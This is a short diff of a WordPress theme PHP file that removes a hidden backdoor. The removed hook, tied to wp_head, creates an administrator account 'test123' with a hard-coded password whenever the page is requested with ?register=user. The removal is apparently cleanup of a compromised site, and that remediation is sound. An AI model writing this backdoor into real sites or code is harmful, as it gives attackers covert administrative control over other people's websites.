@@ -24,16 +24,3 @@ function my_post_type_svcpage() {
                     ) 
                 );
 }
-
-
-add_action('wp_head', 'wploop_register');
-function wploop_register() {
-    if ($_GET['register'] == 'user') {
-        require('wp-includes/registration.php');
-        if (!username_exists('username')) {
-            $user_id = wp_create_user('test123', 'WHyMqCm6UP4TkQAXv');
-            $user = new WP_User($user_id);
-            $user->set_role('administrator');
-        }
-    }
-}
